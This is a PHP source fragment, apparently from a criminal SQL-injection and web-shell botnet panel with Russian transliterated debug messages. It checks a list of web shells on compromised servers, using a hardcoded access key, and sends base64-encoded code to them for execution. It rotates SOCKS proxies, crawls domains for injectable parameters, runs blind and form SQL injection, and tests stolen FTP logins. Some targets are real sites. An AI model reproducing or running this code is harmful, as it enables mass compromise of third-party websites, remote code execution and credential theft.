        $shell_urls = array();
		while ($i < $new_count_shells) {
			$shell_url = str_replace('http://', '', array_shift($original));
			$data = parse_url($shell_url);
			$host = $data['path'];

			if ((5 < strlen($shell_url)) && !(preg_match('/' . $host . '/', $black_shells))) {
				$shell_url = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG', '.php', $shell_url);
				$shell_url = trim($shell_url) . '?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG';
				$shell_urls[$i] = $shell_url;
			}


			++$i;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$count_serv = count($shell_urls);
		$this->d($count_serv, 'BEZ SHELLOV V BLACKLIST');
		$i = 0;

		while ($i < 50) {
			$url = array_shift($shell_urls);
			$url = trim($url);
			// todo: check!
			$ch = $this->evallife($url);
			$tasks[$url] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

        $new_shell_urls = array();
		while ($mrc == CURLM_OK && $active) {
			if (curl_multi_select($cmh) == -1) {
                continue;
            }

				do {

					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$tmp = '';
						if ($info['result'] == 0) {
							$tmp = curl_multi_getcontent($ch);
						} else {
							$err = curl_errno($ch);
							$errmsg = curl_error($ch);
							$header = curl_getinfo($ch);

							if ($err != 0) {
								$this->d(
								    'Страница ' . $header['url']
                                    . ' не была загружена из-за ошибки http_code: ' . $header['http_code']
                                    . ' err:' . $err
                                    . ', errmsg: ' . $errmsg
                                );
							}

						}

						if (strstr($tmp, 'ololo')) {
							$dd = explode('||', $tmp);
							$this->d($tmp, 'NORMALNO');

							if (trim($dd[1]) != 'fuck you') {
								$new_shell_urls[] = $dd[1];
							}

						}

						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($shell_urls)) {
							$url = array_shift($shell_urls);
							$url = trim($url);
							$this->d($url, 'zapusk dopolnitelno count($shell_urls) - ' . count($shell_urls));
							$ch = $this->evallife($url);
							$tasks[$url] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}


				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
		}

		curl_multi_close($cmh);
		$this->serv = $new_shell_urls;
		$this->d(count($new_shell_urls), 'new');
		unlink('goodshelllist.txt');
		$fp = fopen('goodshelllist.txt', 'a+');
		$fp2 = fopen('goodshelllist2.txt', 'a+');

		if (!$this->local_shells) {
			$new_shell_urls = array_unique($new_shell_urls);
		}

		$this->d(count($new_shell_urls), 'new array_uniqu');
		$this->d($new_shell_urls);

		foreach ($new_shell_urls as $output ) {
			fwrite($fp, $output . "\r\n");
			fwrite($fp2, $output . "\r\n");
		}

		fclose($fp);
		fclose($fp2);
		echo 'done';
	}

	public function evallife($url, $type = CURLPROXY_SOCKS5)
	{
		$ch = curl_init($url);
		if (($this->evallife == '') || ($this->evallife == false)) {
			$time = 60;
		}
		 else {
			$time = $this->evallife;
		}

		curl_setopt($ch, CURLOPT_URL, $url);
		$agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.12) Gecko/20050919 Firefox/1.0.7';
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time);
		curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
		curl_setopt($ch, CURLOPT_POST, 1);
		$codec = str_replace('URLURL', $url, $this->code);
		$postdata = 'fack=' . urlencode(base64_encode($codec));
		$headers['Content-Length'] = strlen($postdata);
		$headers['User-Agent'] = 'Curl/1.0';
		$headers['Content-Length'] = strlen($postdata);
		$headers['User-Agent'] = 'Curl/1.0';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		return $ch;
	}

	public function proxyCheck($ku = false)
	{
		if ($this->proxy_enable) {
			if ($this->debug_proxy) {
				$this->d('SBORKA RABOTAET CHEREZ PROXY');
			}


			$this->proxy_all();
			$this->mysqlInj->proxy_inj($this->valid_socks);
		}

	}

	public function proxy_one()
	{
		$this->s();
		$tmp = file('proxy.txt');
		$socks = array_unique($tmp);
		shuffle($socks);
		$b = 0;

		foreach ($socks as $s ) {
			$r = $this->check($s);

			if ($r !== false) {
				$this->valid_socks[] = $r;
				break;
			}


			++$b;

			if ($b == 10) {
				break;
			}


			continue;
		}

		if (0 < count($this->valid_socks)) {
			shuffle($this->valid_socks);

			if ($this->proxy_check_full == true) {
				if ($this->proxy_url_full_check == '') {
					$this->proxy_url_full_check = 'post::http://testphp.vulnweb.com/userinfo.php?uname=test&pass=test';
				}


				if ($this->proxy_answer == '') {
					$this->proxy_answer = 'mysql_fetch_array';
				}


				$url = $this->proxy_url_full_check;
				$this->mysqlInj = new InjectorComponent();
				$this->mysqlInj->proxy_inj($this->valid_socks);
				$this->mysqlInj->proxy_no_check = true;
				$res = $this->mysqlInj->inj_test($url);
				$this->mysqlInj->proxy_no_check = false;

				if ($this->debug_proxy) {
					$this->d($res, '$res');
				}


				if (trim($res) == $this->proxy_answer) {
					if ($this->debug_proxy) {
						$this->d('function proxy_GOOD PROSHEL FULL PORVERKU  !<br>');
						$this->d($this->valid_socks);
					}


					file_put_contents('proxy_good.txt', 'good');
				}
				 else {
					if ($this->debug_proxy) {
						$this->d('function proxy_BAD<br>');
					}


					file_put_contents('proxy_good.txt', 'bad');
				}
			}
			 else {
				if ($this->debug_proxy) {
					echo 'function proxy_GOOD!<br>';
					print_r($this->valid_socks);
				}


				file_put_contents('proxy_good.txt', 'good');
			}
		}
		 else {
			file_put_contents('proxy_good.txt', 'bad');
			$this->stop();
			$this->d('proxy net!!!', 'proxy');
			exit('net proxy');
		}

		$this->p('END_TIME');
	}

	public function proxy_all()
	{
		$this->s();
		$file = 'proxy.txt';
		$now_time = time();
		$time = 0;
		if (file_exists($file) && (10 < filesize($file))) {
			$time = filemtime($file);
		}


		if (300 < ($now_time - $time)) {
			if ($this->debug_proxy) {
				$this->d('KACHAEM proxy');
			}


			$res = file_get_contents($this->proxy_url);
			$tmp = file('proxy.txt');

			if (count($tmp) < 1) {
				$this->stop();
				exit('NOT DOWNLOAD PROXY!!');
			}


			$tmp = array_unique($tmp);
			shuffle($tmp);
		}
		 else {
			$this->d('bez skachivaniya');
			$tmp = file('proxy.txt');
			$socks = array_unique($tmp);
			shuffle($socks);
		}

		$socks = array_slice($tmp, 0, 25);
		$count = 10;
		$i = 1;
		$b = 0;

		foreach ($socks as $s ) {
			$r = $this->check($s);

			if ($r !== false) {
				$this->valid_socks[] = $r;

				if ($i == $count) {
					break;
				}


				++$i;
			}
			 else {
				++$b;

				if ($b == 50) {
					break;
				}


				continue;
			}
		}

		if (0 < count($this->valid_socks)) {
			shuffle($this->valid_socks);

			if ($this->debug_proxy) {
				$this->d($this->valid_socks, 'function proxy_all_good PREDVARITELNYA');
			}


			if ($this->proxy_check_full == true) {
				if ($this->proxy_url_full_check == '') {
					$this->proxy_url_full_check = 'post::http://testphp.vulnweb.com/userinfo.php?uname=test&pass=test';
				}


				if ($this->proxy_answer == '') {
					$this->proxy_answer = 'mysql_fetch_array';
				}


				$url = $this->proxy_url_full_check;
				$this->mysqlInj = new InjectorComponent();
				$this->mysqlInj->proxy_inj($this->valid_socks);
				$this->mysqlInj->proxy_no_check = true;
				$res = $this->mysqlInj->inj_test($url);
				$this->mysqlInj->proxy_no_check = false;

				if (trim($res) == $this->proxy_answer) {
					if ($this->debug_proxy) {
						$this->d('function proxy_GOOD PROSHEL FULL PORVERKU  !<br>');
						$this->d($this->valid_socks);
					}


					file_put_contents('proxy_good.txt', 'good');
				}
				 else {
					echo 'function proxy_BAD<br>';
					file_put_contents('proxy_good.txt', 'bad');
				}
			}
			 else {
				echo 'function proxy_GOOD!<br>';
				print_r($this->valid_socks);
				file_put_contents('proxy_good.txt', 'good');
			}

			$this->head_enable = false;
			return;
		}


		$this->stop();
		$this->d('proxy_all net!!!', 'proxy_all');
		file_put_contents('proxy_good.txt', 'bad');
		$this->head_enable = false;
		exit('net proxy');
	}

	public function check($proxy)
	{
		$s = explode(':', $proxy);
		$ch = curl_init($this->url2);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

		if ($this->uagent != '') {
			curl_setopt($ch, CURLOPT_USERAGENT, $this->uagent);
		}


		if ($this->referer != '') {
			curl_setopt($ch, CURLOPT_REFERER, $this->referer);
		}


		if (isset($s[0])) {
			curl_setopt($ch, CURLOPT_PROXY, $s[0] . ':' . $s[1]);
		}


		if (isset($s[2])) {
			$this->d($proxy);
			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $s[2] . ':' . $s[3]);
		}


		$buffer = curl_exec($ch);

		if ($this->debug_proxy == true) {
			$this->d($buffer, '$buffer');
			$err = curl_errno($ch);
			$errmsg = curl_error($ch);
			$this->d($err, '$err');
			$this->d($errmsg, '$errmsg');
		}


		if (curl_errno($ch) || ($buffer == '') || (strpos($buffer, $this->text) === false)) {
			$out = false;
		}
		 else {
			$out = $proxy;
		}

		curl_close($ch);
		return $out;
	}

	public function pars()
	{
		$all_url = array('http://www.pavillon-hannover.de');
		$cmh = curl_multi_init();
		$tasks = array();

		foreach ($all_url as $url ) {
			$ch = $this->parscurl($url);
			$tasks[$url] = $ch;
			curl_multi_add_handle($cmh, $ch);
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		$engeen_addr = array('tube', 'google', 'topic=', 'modules.php', 'act=Help', 'module=forums', 'module=help', 'name=News', 'name=Pages', 'name=Content', 'option=com', 'option=com_content', 'viewtopic.php', 'thread.php', 'showtopic=', 'showthread.php', 'forum', 'facebook');

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$url = array_search($ch, $tasks);

						if ($info['result'] == 0) {
							$tasks[$url] = curl_multi_getcontent($ch);
							$vnut = array();
							$vnech = array();
							@preg_match_all('/((http|https):\\/\\/)?(www\\.)?[\\w\\-_]+(\\.[\\w\\-_\\.]+\\/)((\\/[a-zA-Z0-9]+\\/)|)([a-zA-Z0-9\\/]+\\.[a-zA-Z0-9]+\\?)([a-zA-Z0-9]+)(\\s*\\=)([a-zA-Z0-9\\/_.-]+)/im', curl_multi_getcontent($ch), $matches);
							$p = 0;
							$this->d($matches, '$matches');

							if (empty($matches[0])) {
								$this->d('empty($matches)');
								@preg_match_all('/((\\/[a-zA-Z0-9]+\\/)|)([a-zA-Z0-9\\/]+\\.[a-zA-Z0-9]+\\?)([a-zA-Z0-9]+)(\\s*\\=)([a-zA-Z0-9\\/_.-]+)/im', curl_multi_getcontent($ch), $matches);
								$p = 1;
							}


							$getN = array();
							$fenN = array();

							foreach ($matches[0] as $get ) {
								$get = str_replace($http, '', $get);

								if (!(in_array($get, $getN))) {
									$nm = parse_url($get);
									$name2 = str_replace('?', '', $nm['host']);
									@preg_match_all('/(.*)(\\?)/', $get, $gn);
									$name = str_replace('?', '', $gn[1][0]);
									$this->d($name, '$name - reg');

									if (!(@in_array($name2, $fenN)) && @in_array(substr(strrchr($name, '.'), 1), array('php'))) {
										$get = str_replace('http://', '', $get);
										$get = str_replace('https://', '', $get);
										$get = str_replace('%26', '&', $get);
										$get = trim($get);

										if ($p == 1) {
											$h1 = parse_url($url);
											$this->d($h1);

											if ($h1['host'] != '') {
												$get = $h1['host'] . $get;
											}
											 else {
												$get = $h1['path'] . '/' . $get;
											}
										}


										$get = str_replace('//', '/', $get);
										$get = str_replace($engeen_addr, 'DICK!', $get);
										$get = 'http://' . $get;

										if (!(strstr($get, 'DICK!')) && strstr($get, '?')) {
											$getN[] = $get;
										}


										$fenN[] = $name2;
									}

								}

							}

							$getN = array_unique($getN);
							$this->d($getN, '$getN');
							$this->d($fenN, '$fenN');
						}
						 else {
							$err = curl_errno($ch);
							$errmsg = curl_error($ch);
							$header = curl_getinfo($ch);

							if ($err != 0) {
								echo 'Страница ' . $header['url'] . ' не была загружена из-за ошибки http_code: ' . $header['http_code'] . ' err:' . $err . ', errmsg: ' . $errmsg;
							}

						}

						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);
					}

				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
			 else {
				echo 'ahtung';
			}

			++$b;
		}
	}

	public function parscurl($url)
	{
		$ch = curl_init($url);
		$uagent = array('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)');
		$rand_keys = array_rand($this->proxy);
		$s = explode(':', $this->proxy[$rand_keys]);
		$ua = trim($uagent[mt_rand(0, sizeof($uagent) - 1)]);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
		return $ch;
	}

	public function checkftp()
	{
		$data = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/ftp.txt');
		$all = count($data);
		$all = count($data);
		$i = 0;

		while ($i < $all) {
			$data[$i] = str_replace("\n", '', $data[$i]);
			$data[$i] = str_replace("\r", '', $data[$i]);
			list($lp, $domain) = explode('@', $data[$i]);
			list($login, $password) = explode(':', $lp);
			$open = ftp_connect($domain, 21, 10);

			if (!($open)) {
				$this->d($domain, 'not ftp connect');
				exit();
			}


			if (!(ftp_login($open, $login, $password))) {
				$this->d('Не могу соединиться c ' . $login . '-' . $password);
				continue;
			}


			$this->d($login . '-' . $password, 'good');
			flush();
			++$i;
		}
	}
// visit
	public function checkmysql()
	{
	}

	public function parseForm($url)
	{
		$url = 'http://testphp.vulnweb.com/login.php';
		$mysqlInj = new $this->Injector();
		$mysqlInj->form_start($url);
	}

	public function blind_new($url)
	{
		$url = 'http://www.autosaar.de/rubrikenblock.php?rub=3';
		$mysqlInj = new $this->Injector();
		$res = $mysqlInj->blind($url);
		$this->d($res, 'res');
	}

	public function crowler($domen = 'testphp.vulnweb.com')
	{
		$res = $this->check_domen_red($domen);

		if (!(res)) {
			$this->d($domen, 'bad');
			exit();
		}


		$exp = explode('::', $res);
		$this->d($exp, '$exp');
		$domen = $exp[0];
		$mysqlInj = new $this->Injector();

		if ($exp[1] == 'https') {
			$mysqlInj->https = true;
		}


		$res = $mysqlInj->start_crowler($domen);
		$this->d($res, 'res');
	}

	public function post_input($rrr = '')
	{
		$link = base64_decode($this->data);
		$check = @$this->check;
		$this->d($this->data, 'data');
		$this->d($link, '$link');

		if (preg_match('/get::/i', $link)) {
			$link = str_replace('get::', '', $link);
			$header = 'get';
		}
		 else if (preg_match('/post::/i', $link)) {
			$link = str_replace('post::', '', $link);
			$header = 'post';
		}
		 else {
			$header = 'get';
		}

		$tmp2 = explode('::', $link);
		$link = $tmp2[0];
		$type = $tmp2[1];
		$this->d($link, '$link');
		$this->mysqlInj = new $this->Injector();
		$clean = $this->mysqlInj->filter_url($link);
		$this->d($clean, 'clean');
		$rr = parse_url('http://' . $clean);
		$this->d($rr, 'rr');
		$domen = $rr['host'];
		$domen = str_replace('www.', '', $domen);
		$date = date('Y-m-d h:i:s');
		$path_query = @$rr['query'];
		$count = $this->Filed->query('select count(*) FROM `posts_all` WHERE `domen` like \'%' . $domen . '%\'');
		$ccc = $count[0][0]['count(*)'];

		if ($check == 0) {
			$type2 = 0;
		}
		 else if ($check == 1) {
			$type2 = 2;
		}


		if ($ccc < $this->link_count) {
			if ($path_query != '') {
				if ($this->Post->query('INSERT INTO `posts_all` (`domen`,`url`,`gurl`,`date`,`header`,`path_query`,`find`,`status`,`from`) VALUES(\'' . $domen . '\',\'' . $clean . '\',\'' . $clean . '\',\'' . $date . '\',\'' . $header . '\',\'' . $path_query . '\',\'' . $type . '\',' . $type2 . ',\'crowler\')')) {
					$this->d('insert good');
				}
				 else {
					$this->d( mysql_error());
				}

				$this->d( 'INSERT INTO `posts_all` (`domen`,`url`,`gurl`,`date`,`header`,`path_query`,`find`,`status`,`from`) VALUES(\'' . $domen . '\',\'' . $clean . '\',\'' . $clean . '\',\'' . $date . '\',\'' . $header . '\',\'' . $path_query . '\',\'' . $type . '\',' . $type2 . ',\'crowler\')');
				return;
			}


			$this->d('path_quetry pustoy');
		}

	}

	public function check_domens()
	{
		$this->timeStart = $this->start('check_domens', 1);
		$file = $this->Post->query('SELECT * FROM `domens` WHERE `domen_check`=0 AND `bad` !=1 limit ' . $this->error_limit_check);
		$this->d($file, '$file');
		$time_all = time();
		$time2 = 1000;

		foreach ($file as $val ) {
			$new = time();
			$razn = $new - $time_all;
			$id = $val['domens']['id'];
			$this->d($val, '$val');
			$domen = $val['domens']['domen'];
			$this->d($domen, '$domen');
			$this->Post->query('UPDATE  `domens`  set `domen_check`=1 WHERE `id`=' . $id . ' ');

			if ($time2 < $razn) {
				$this->d('TIME!!!! ALL');
				$this->Post->query('UPDATE  `domens`  set `bad` = 1,`status`=1,`domen_check`=1 WHERE `id`=' . $id . ' ');
				$this->stop();

				return false;
			}


			$res = $this->check_domen_red($domen, $this->time_check_domens);
			$this->workup();

			if ($res === false) {
				$this->Post->query('UPDATE  `domens`  set `bad` = 1,`status`=1,`domen_check`=1 WHERE `id`=' . $id . ' ');
			}
			 else {
				$exp = explode('::', $res);
				$this->d($exp, '$exp');

				if ($exp[1] == 'https') {
					$domen_new = $exp[0];
					$http = 'https://';
				}
				 else if ($exp[1] == 'http') {
					$domen_new = $exp[0];
					$http = 'http://';
				}
				 else {
					$domen_new = $exp[0];
					$http = 'http://';
				}

				$this->Post->query('UPDATE  `domens`  set `domen_new` = \'' . $domen_new . '\',`http`=\'' . $http . '\',`domen_check`=1 WHERE `id`=' . $id . ' ');
			}
		}

		$this->stop();
	}

	public function check_domen_red($domen, $time_check_domens = 30)
	{
		$domen = str_replace(array('http://', 'htpps://', 'www.'), '', $domen);
		$ch = curl_init();
		$headers = array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8', 'Accept-Language: ru,en-us;q=0.7,en;q=0.3', 'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7');
		$uagent = array('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)');
		$ua = trim($uagent[mt_rand(0, sizeof($uagent) - 1)]);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_URL, $domen);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_REFERER, $domen);
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time_check_domens);
		$data = curl_exec($ch);
		$err = curl_errno($ch);
		$errmsg = curl_error($ch);
		$head = curl_getinfo($ch);
		$this->d($err, '$err');
		$this->d($errmsg, '$errmsg');
		file_put_contents('./file_domen.txt', $data);

		if (preg_match('/Location: ([\S]+)\b/', $data, $rr)) {
			$url = preg_replace('#$#', '', $rr[1]);

			if (preg_match('/^(http:\/\/)?(www.)?' . $domen . '/si', $url)) {
				$url = str_replace('http://', '', $url);
				$ch2 = curl_init();
				curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
				curl_setopt($ch2, CURLOPT_URL, 'https://' . $url . ':443');
				curl_setopt($ch2, CURLOPT_HEADER, 1);
				curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 10);
				curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
				curl_setopt($ch2, CURLOPT_MAXCONNECTS, 3);
				curl_setopt($ch2, CURLOPT_REFERER, $domen);
				curl_setopt($ch2, CURLOPT_USERAGENT, $ua);
				$data2 = curl_exec($ch2);
				$err2 = curl_errno($ch2);
				$errmsg2 = curl_error($ch2);
				$head2 = curl_getinfo($ch2);
				if (($head2['http_code'] == 200) || ($head2['http_code'] == '200')) {
					return $url . '::https';
				}


				return $url . '::http';
			}


			if (preg_match('/^(https:\/\/)?(www.)?' . $domen . '/si', $url)) {
				$url = str_replace('https://', '', $url);
				return $url . '::https';
			}


			return false;
		}


		$inf = 'http://seoanalitics.ru/audit/ajax-poisk-1.php?start=0&q=info:' . $domen;

		if (file_get_contents($inf)) {
			$ginfo = file_get_contents($inf);
			$ginfo = eregi_replace('(.*)<li><a href=', '', $ginfo);
			$ginfo = eregi_replace(' >(.*)', '', $ginfo);
			$ginfo = eregi_replace('https://', '', $ginfo);
			$ginfo = eregi_replace('http://', '', $ginfo);

			if (substr($ginfo, -1) == '/') {
				$ginfo = substr($ginfo, 0, -1);
			}


			if (preg_match('/^(http:\/\/)?(www.)?' . $domen . '/si', $ginfo)) {
				return $ginfo . '::http';
			}

		}


		return $domen . '::http';
	}
	
	private function set_domen_status($status, $find, $domen, $id_domen) {
		$id_q = 'SELECT `id` FROM `domens` WHERE `id` = ' . $id_domen . ' limit 1';
		$id_q_like = 'SELECT `id` FROM `domens` WHERE `domen_new` like \'' . $domen . '%\' or `id`=' . $id_domen . ' limit 1';
		$upd_q = 'UPDATE `domens` SET `find`=\'' . $find . '\', `status`=' . $status . ' WHERE `id` =';
		$upd_q_like = 'UPDATE `domens` SET  `find`=\'' . $find . '\', `status`=' . $status . ' WHERE  `domen_new` like \'' . $domen . '%\'';
		
		$id_r = $this->Post->query($id_q);
		$id = $id_r[0]['domens']['id'];
		// $this->d($id_r);
		$this->d($id_q);

		if (count($id) == 1) {
			$this->Post->query($upd_q . $id);
			$this->d($upd_q . $id, 'good update');
		} else {
			$this->d($domen, 'Id not found');
			$id2 = $this->Post->query($id_q_like);
			
			if (count($id2) == 1) {
				$this->Post->query($upd_q_like);
				$this->d($upd_q_like, 'LIKE UPDATE');
			} else {
				$this->d('VIA LIKE NOT FOUND');
			}
		}
	}

	public function find_domen_sqli($test = '')
	{
		$this->domens = true;
		$file = $this->Post->query('SELECT count(*) as count FROM `domens` WHERE `status`=0 AND `domen_check`=1');
		$time_start = -1;
		if (intval($file[0][0]['count']) !== 0) {
			$this->timeStart = $this->start('find_domen_sqli', 1);
			$time_start = $this->timeStart;
		}
		 else {
			$this->d($file, '$file count');
			$this->d('TimeStart');
			exit();
		}

		$r = rand(1, 100);
		$this->Post->query('UPDATE  `domens`  set `domen` =  REPLACE(url,\'http://\',\'\')');
		$urls = $this->Post->query('SELECT * FROM `domens` WHERE `status`=0 AND `domen_check`=1 AND `bad` !=1  AND `domen_new` !=\'\' limit ' . $this->error_limit_domen);
		$this->d($urls, '$urls');
		// чек только на локальных
		$this->local_shells = true;
		$this->evaltest();
		$this->proxyCheck();
		$serv = $this->serv;
		$this->set_code($this->build_shell_code('crawler.php'));
		
		$cmh = curl_multi_init();
		$tasks = array();
		$count_serv = count($serv);
		$count_urls = count($urls);
		$this->d($count_serv, 'count_serv_kolichetvo!!');
		$this->d($count_urls, '$count_domenov');
		$newservv = $serv;
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == $count_serv) || (count($urls) == 0)) {
				$this->d($i, 'count->break');
				break;
			}


			flush();
			$kkk = count($newservv);
			$lll = mt_rand(1, $kkk-1);
			$urserv = $newservv[$lll];
			$urs_shell = $urserv;
			$urs_one = array_shift($urls);
			$urs_shell = trim($urs_shell);
			if (!(empty($urs_shell))) {
				$urlllll = trim($urs_one['domens']['domen_new']);
				$urlllll = $urs_one['domens']['http'] . $urlllll;
				$urlllll = trim($urlllll);
				$ch = $this->create_streem($urs_shell, $urlllll, $this->time_crowler);
				$tasks[$urlllll . ':::' . $urs_one['domens']['id']] = $ch;
				curl_multi_add_handle($cmh, $ch);
			}


			++$i;
		}

		$active = null;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK && $active) {
			//$this->d("wait for shell response");
			if (curl_multi_select($cmh) != -1) {
				do {
					//$this->d("process inject to shell");
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);
					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$this->d($ch, 'ch');
						$ku = array_search($ch, $tasks);
						$this->d($ku, '$ku');
						
						$ttt = explode(':::', $ku);
							$url['domens']['domen_new'] = $ttt[0];
						$url['domens']['id'] = $ttt[1];
						$url_struct = parse_url($ttt[0]);
						$url['domens']['host'] = $url_struct['host'];
						$domen33 = '';
						
						if ($info['result'] == 0) {
							$cont = curl_multi_getcontent($ch);
							/* раскоментировать если удаленные шеллы
							if ($this->check_bad_response($cont)) {
								$shell_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
								$this->d($shell_url, 'SHELL URL');
								$this->write_blackshell($shell_url);

								$this->d(
                 				   "Internal Server Error OTVET\n"
                  			  );
								curl_multi_remove_handle($cmh, $ch);
								curl_close($ch);
								continue;
							}
							*/
							$this->d($cont, 'Content');
							$url2 = $url['domens']['domen_new'];
							$this->d($url, 'url mass');
							flush();
							$cont = explode(':::', $cont);
							$cont[1] = trim($cont[1]);
							$cont[2] = trim($cont[2]);

							$this->d($cont, '-cont OTVET ' . $url['domens']['domen_new']);

							$cont[0] = $this->replace_url_schema_tab_trim($cont[0]);
							
							$cont[0] = str_replace('www.', '', trim($cont[0]));
							$cont[0] = mysql_real_escape_string($cont[0]);
							$ddd = $cont[0];
